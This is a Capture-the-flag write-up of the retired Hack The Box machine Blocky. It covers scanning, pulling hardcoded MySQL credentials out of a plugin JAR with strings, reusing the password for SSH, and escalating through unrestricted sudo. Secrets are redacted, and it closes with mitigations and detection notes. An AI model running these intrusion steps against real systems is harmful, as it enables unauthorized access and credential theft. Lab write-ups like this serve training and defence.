---
machine: Blocky
os: Linux
difficulty: Easy
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, wordpress, jar, credentials, sudo]
---

# Blocky — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired, publishable writeup.
> Reference notes for a retired box. No real flags or credentials.

## TL;DR

A WordPress blog with an FTP that refuses anonymous logins. `/plugins/` holds two JARs from a Minecraft plugin; one of them, `BlockyCore.jar`, carries MySQL credentials written into the bytecode. The password is reused for the blog's user, so SSH as `notch` works. `sudo -l` shows `(ALL : ALL) ALL`: straight to root.

## Recon

```bash
nmap -Pn -sC -sV -p- <IP> -oN nmap.txt
```

```text
21/tcp  ftp   ProFTPD 1.3.5a
22/tcp  ssh   OpenSSH 7.2p2 Ubuntu
80/tcp  http  Apache httpd 2.4.18 → blocky.htb
```

```bash
echo "<IP> blocky.htb" | sudo tee -a /etc/hosts
```

FTP rejects anonymous access; port 8192 shows closed in some scans and adds nothing.

## Enumeration

```bash
whatweb http://blocky.htb
gobuster dir -u http://blocky.htb/ -w /usr/share/wordlists/dirb/common.txt -x php,txt -t 40
```

```text
/index.php           (301)
/plugins/            (200)
/readme.html         (200)
/wp-admin/           (301)
/wp-login.php        (200)
```

`/plugins/` contains two files:

```text
BlockyCore.jar                 (883 B)
griefprevention-1.11.2-3.1.1.298.jar
```

The small one is the interesting bit: a custom plugin by the administrator.

```bash
wget http://blocky.htb/plugins/BlockyCore.jar
unzip -l BlockyCore.jar
strings BlockyCore.jar | grep -Ei 'pass|user|jdbc|mysql'
```

```text
sqlUser: root
sqlPass: <password>
jdbc:mysql://localhost:3306/...
```

If `strings` is not enough, `jadx` or `cfr` decompile the class:

```bash
jadx -d out BlockyCore.jar && grep -rn "sqlPass" out
```

WordPress user enumeration:

```bash
curl -s -I "http://blocky.htb/?author=1" | grep -i location
# /index.php/author/notch/
```

## Foothold

The MySQL password is reused at the system level:

```bash
ssh notch@blocky.htb
# password: <password>
```

## Escalation

```bash
sudo -l
```

```text
User notch may run the following commands on blocky:
    (ALL : ALL) ALL
```

```bash
sudo su
# root
```

That is all: the user is in sudoers without restrictions.

## Evidence

- `whoami` → `notch`, then `root`.
- `strings` on the JAR showing the password field (redacted).
- `user.txt` and `root.txt` read (redacted).

## Lessons learned

- Custom plugins and JARs are unreviewed third-party code: plaintext credentials inside bytecode are common.
- `strings` answers in seconds what a decompiler takes longer for; try the cheap path first.
- `/?author=1` remains the fastest way to enumerate WordPress users.
- Reusing the database password as a system password is the real bridge between the finding and the shell.
- `(ALL : ALL) ALL` leaves nothing to exploit: it is administrative root.

## Mitigations and detection

- Never package credentials into distributable artefacts; use environment variables or a secret manager.
- Rotate the database password and do not reuse it for system accounts.
- Restrict sudo by command and user, not `ALL`.
- Disable WordPress author enumeration (`?author=`), or at least avoid leaking the login.
- Detection: JAR downloads from the web root, `strings`/decompilers on the host, SSH logins with the blog account.
- MITRE: T1552.001 (credentials in files), T1078, T1548.003.

## References

- MITRE ATT&CK: T1552.001, T1548.003.
- WordPress documentation on author enumeration.
